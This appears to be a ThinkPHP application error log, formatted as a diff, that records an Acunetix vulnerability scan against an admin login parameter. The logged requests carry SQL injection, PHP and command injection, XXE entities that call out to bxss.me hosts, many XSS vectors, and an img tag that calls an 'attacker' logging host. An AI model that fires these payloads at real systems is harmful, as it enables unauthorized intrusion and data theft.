+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=testasp.vulnweb.com/t/xss.html%3f%2500
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000835s ]
+ERR: 无法加载模块:Testasp.vulnweb.com/t/xss.html?%00
+
+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=";print(md5(acunetix_wvs_security_test));%24a="
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003124s ]
+ERR: 无法加载模块:";print(md5(acunetix_wvs_security_test));$a="
+
+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=%24{%40print(md5(acunetix_wvs_security_test))}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000673s ]
+ERR: 无法加载模块:${@print(md5(acunetix_wvs_security_test))}
+
+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=%24{%40print(md5(acunetix_wvs_security_test))}%5c
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000693s ]
+ERR: 无法加载模块:${@print(md5(acunetix_wvs_security_test))}\
+
+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=http://hitQcHq0eveQg.bxss.me/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000989s ]
+ERR: 无法加载模块:Http://hitQcHq0eveQg.bxss.me/
+
+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1);%20waitfor%20delay%20'0:0:6'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000646s ]
+ERR: 无法加载模块:-1); waitfor delay '0:0:6' -- 
+
+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1));%20waitfor%20delay%20'0:0:2'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000834s ]
+ERR: 无法加载模块:-1)); waitfor delay '0:0:2' -- 
+
+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=1%20waitfor%20delay%20'0:0:2'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000597s ]
+ERR: 无法加载模块:1 waitfor delay '0:0:2' -- 
+
+[ 2017-11-18T19:59:28+08:00 ] 127.0.0.1 /admin.php?c=login&m=Hjs8kBWM';%20waitfor%20delay%20'0:0:2'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000704s ]
+ERR: 无法加载模块:Hjs8kBWM'; waitfor delay '0:0:2' -- 
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=YDS3OJXf');%20waitfor%20delay%20'0:0:2'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000720s ]
+ERR: 无法加载模块:YDS3OJXf'); waitfor delay '0:0:2' -- 
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=admin.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000607s ]
+ERR: 无法加载模块:Admin.php
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=admin.php%00
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000797s ]
+ERR: 无法加载模块:Admin.php
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=WZxCZICK'));%20waitfor%20delay%20'0:0:2'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000718s ]
+ERR: 无法加载模块:WZxCZICK')); waitfor delay '0:0:2' -- 
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1;select%20pg_sleep(2);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000581s ]
+ERR: 无法加载模块:-1;select pg_sleep(2); -- 
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=admin.php/.
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.002474s ]
+ERR: 无法加载模块:Admin.php/.
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000707s ]
+ERR: 无法加载模块:)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1);select%20pg_sleep(4);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000674s ]
+ERR: 无法加载模块:-1);select pg_sleep(4); -- 
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1));select%20pg_sleep(4);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000800s ]
+ERR: 无法加载模块:-1));select pg_sleep(4); -- 
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=WU4mBeST';select%20pg_sleep(4);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000611s ]
+ERR: 无法加载模块:WU4mBeST';select pg_sleep(4); -- 
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=zv1eEpog');select%20pg_sleep(4);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000722s ]
+ERR: 无法加载模块:Zv1eEpog');select pg_sleep(4); -- 
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=flHpUagZ'));select%20pg_sleep(4);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000702s ]
+ERR: 无法加载模块:FlHpUagZ'));select pg_sleep(4); -- 
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=<%3fxml%20version="1.0"%20encoding="utf-8"%3f>%0d%0a<!DOCTYPE%20acunetix%20[%0d%0a%20%20<!ENTITY%20acunetixent%20SYSTEM%20"http://hitxLBHwq79t5.bxss.me/">%0d%0a]>%0d%0a<xxx>%26acunetixent;</xxx>%0d%0a
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000804s ]
+ERR: 无法加载模块:
+
+&acunetixent;
+
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m='"
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000658s ]
+ERR: 无法加载模块:'"
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=<!--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.002014s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=1'"
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000840s ]
+ERR: 无法加载模块:1'"
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=1%00%c0%a7%c0%a2%252527%252522
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000587s ]
+ERR: 无法加载模块:1����%2527%2522
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=%40%40o5dwH
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000569s ]
+ERR: 无法加载模块:@@o5dwH
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=/www.vulnweb.com
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000635s ]
+ERR: 无法加载模块:/www.vulnweb.com
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=JyI=
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000645s ]
+ERR: 无法加载模块:JyI=
+
+[ 2017-11-18T19:59:29+08:00 ] 127.0.0.1 /admin.php?c=login&m=946954
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000638s ]
+ERR: 无法加载模块:946954
+
+[ 2017-11-18T19:59:30+08:00 ] 127.0.0.1 /admin.php?c=login&m=%bf'%bf"
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000775s ]
+ERR: 无法加载模块:�'�"
+
+[ 2017-11-18T19:59:30+08:00 ] 127.0.0.1 /admin.php?c=login&m=http://www.vulnweb.com
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000589s ]
+ERR: 无法加载模块:Http://www.vulnweb.com
+
+[ 2017-11-18T19:59:30+08:00 ] 127.0.0.1 /admin.php?c=login&m=//www.vulnweb.com
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000757s ]
+ERR: 无法加载模块://www.vulnweb.com
+
+[ 2017-11-18T19:59:30+08:00 ] 127.0.0.1 /admin.php?c=login&m=%f0''%f0""
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001415s ]
+ERR: 无法加载模块:�''�""
+
+[ 2017-11-18T19:59:30+08:00 ] 127.0.0.1 /admin.php?c=login&m=/%5cwww.vulnweb.com
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000647s ]
+ERR: 无法加载模块:/\www.vulnweb.com
+
+[ 2017-11-18T19:59:30+08:00 ] 127.0.0.1 /admin.php?c=login&m=<%3fxml%20version="1.0"%20encoding="utf-8"%3f>%0d%0a%20%20<!DOCTYPE%20roottag%20PUBLIC%20"-//VSR//PENTEST//EN"%20"http://hitZbVrfHqKbP.bxss.me/">%0d%0a<roottag>acunetix</roottag>%0d%0a
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000586s ]
+ERR: 无法加载模块:
+  
+acunetix
+
+
+[ 2017-11-18T19:59:31+08:00 ] 127.0.0.1 /admin.php?c=login&m=<xi:include%20href="http://hitvnwcAw4WWL.bxss.me/"%20parse="text"/>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001012s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:59:31+08:00 ] 127.0.0.1 /admin.php?c=login&m=<%3fxml%20version="1.0"%20encoding="UTF-8"%3f>%0d%0a<!DOCTYPE%20foo%20[%0d%0a<!ELEMENT%20foo%20ANY%20>%0d%0a<!ENTITY%20%25%20xxe%20SYSTEM%20"http://hitsZXg2eNmss.bxss.me/">%0d%0a%25xxe;%0d%0a]>%0d%0a
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000723s ]
+ERR: 无法加载模块:
+
+%xxe;
+]>
+
+
+[ 2017-11-18T19:59:31+08:00 ] 127.0.0.1 /admin.php?c=login&m=<%3fxml%20version="1.0"%20encoding="UTF-8"%3f>%0d%0a<!DOCTYPE%20body%20SYSTEM%20"http://hitPscvQmnzjY.bxss.me/">%0d%0a<body><method>test</method></body>%0d%0a
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000642s ]
+ERR: 无法加载模块:
+
+test
+
+
+[ 2017-11-18T19:59:36+08:00 ] 127.0.0.1 /admin.php?c=login&m=1'"()%26%25<acx><ScRiPt%20>8sqI(9290)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000710s ]
+ERR: 无法加载模块:1'"()&%8sqI(9290)
+
+[ 2017-11-18T19:59:36+08:00 ] 127.0.0.1 /admin.php?c=login&m='"()%26%25<acx><ScRiPt%20>8sqI(9779)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000581s ]
+ERR: 无法加载模块:'"()&%8sqI(9779)
+
+[ 2017-11-18T19:59:36+08:00 ] 127.0.0.1 /admin.php?c=login&m=19643579
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000657s ]
+ERR: 无法加载模块:19643579
+
+[ 2017-11-18T19:59:36+08:00 ] 127.0.0.1 /admin.php?c=login&m=acu8550%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca8550
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000638s ]
+ERR: 无法加载模块:Acu8550＜s1﹥s2ʺs3ʹuca8550
+
+[ 2017-11-18T19:59:36+08:00 ] 127.0.0.1 /admin.php?c=login&m=acux5548%C0%BEz1%C0%BCz2a%90bcxuca5548
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000777s ]
+ERR: 无法加载模块:Acux5548��z1��z2a�bcxuca5548
+
+[ 2017-11-18T19:59:36+08:00 ] 127.0.0.1 /admin.php?c=login&m={{9999323*9999717}}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000252s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000992s ]
+ERR: 无法加载模块:{{9999323*9999717}}
+
+[ 2017-11-18T19:59:36+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<ScRiPt%20>8sqI(9634)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000608s ]
+ERR: 无法加载模块:18sqI(9634)
+
+[ 2017-11-18T19:59:36+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<WHFZYO>GYMKX[!%2b!]</WHFZYO>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000585s ]
+ERR: 无法加载模块:1GYMKX[!+!]
+
+[ 2017-11-18T19:59:36+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<script>8sqI(9117)</script>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000644s ]
+ERR: 无法加载模块:18sqI(9117)
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1%3C%53%63%52%3C%53%63%52%69%50%74%3E%49%70%54%3E%38%73%71%49%28%39%30%36%38%29%3C%2F%73%43%72%3C%53%63%52%69%50%74%3E%49%70%54%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000913s ]
+ERR: 无法加载模块:18sqI(9068)
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<ScRiPt%20%0d%0a>8sqI(9798)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000732s ]
+ERR: 无法加载模块:18sqI(9798)
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<ScRiPt/acu%20src=//testasp.vulnweb.com/t/xss.js%3f9632></ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000621s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<%00ScRiPt%20%0d%0a>8sqI(9869)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000575s ]
+ERR: 无法加载模块:18sqI(9869)
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<video><source%20onerror="javascript:8sqI(9033)">
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000845s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<svg%09%0a%0b%0c%0d%a0%00onload=8sqI(9399);>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000730s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<isindex%20type=image%20src=1%20onerror=8sqI(9921)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000566s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<iframe%20src='data:text/html;base64%2cPHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo='%20invalid='9011'>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000649s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<body%20onload=8sqI(9250)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000662s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<img%20src=//testasp.vulnweb.com/t/dot.gif%20onload=8sqI(9863)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000568s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<img%20src=xyz%20OnErRor=8sqI(9553)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000633s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<img/src=">"%20onerror=alert(9204)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000586s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=%2531%253C%2553%2563%2552%2569%2550%2574%2520%253E%2538%2573%2571%2549%25289923%2529%253C%252F%2573%2543%2572%2569%2570%2554%253E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001283s ]
+ERR: 无法加载模块:%31%3C%53%63%52%69%50%74%20%3E%38%73%71%49%289923%29%3C%2F%73%43%72%69%70%54%3E
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1\u003CScRiPt\8sqI(9834)\u003C/sCripT\u003E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000719s ]
+ERR: 无法加载模块:1\u003CScRiPt\8sqI(9834)\u003C/sCripT\u003E
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1%26lt;ScRiPt%26gt;8sqI(9864)%26lt;/sCripT%26gt;
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000604s ]
+ERR: 无法加载模块:1&lt;ScRiPt&gt;8sqI(9864)&lt;/sCripT&gt;
+
+[ 2017-11-18T19:59:37+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<input%20autofocus%20onfocus=8sqI(9910)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.002118s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=<a%20HrEF=http://www.vulnweb.com></a>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001109s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=<a%20HrEF=jaVaScRiPT:>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000682s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=[url=http://www.vulnweb.com][/url]
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000633s ]
+ERR: 无法加载模块:[url=http://www.vulnweb.com][/url]
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<img<!--%20-->%20src=x%20onerror=alert(9540);//><!--%20-->
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000648s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=1}body{acu:Expre/**/SSion(8sqI(9720))}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.002298s ]
+ERR: 无法加载模块:1}body{acu:Expre/**/SSion(8sqI(9720))}
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<%25%20contenteditable%20onresize=8sqI(9389)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000725s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=165EH0%0a<ScRiPt%20>8sqI(9804)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000655s ]
+ERR: 无法加载模块:165EH0
+8sqI(9804)
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=response.write(9668897*9082545)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000622s ]
+ERR: 无法加载模块:Response.write(9668897*9082545)
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<WKVX17>YKSQ9[!%2b!]</WKVX17>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000830s ]
+ERR: 无法加载模块:1YKSQ9[!+!]
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m='%2bresponse.write(9668897*9082545)%2b'
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000728s ]
+ERR: 无法加载模块:'+response.write(9668897*9082545)+'
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<ifRAme%20sRc=9606.com></IfRamE>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000071s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001846s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m="%2bresponse.write(9668897*9082545)%2b"
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000633s ]
+ERR: 无法加载模块:"+response.write(9668897*9082545)+"
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=set%7cset%26set
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000737s ]
+ERR: 无法加载模块:Set|set&set
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<HyJqwh%20x=9560>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000747s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=%24(nslookup%20jsLMgtNb)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000621s ]
+ERR: 无法加载模块:$(nslookup jsLMgtNb)
+
+[ 2017-11-18T19:59:38+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<img%20sRc='http://attacker-9153/log.php%3f
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000633s ]
+ERR: 无法加载模块:1
+
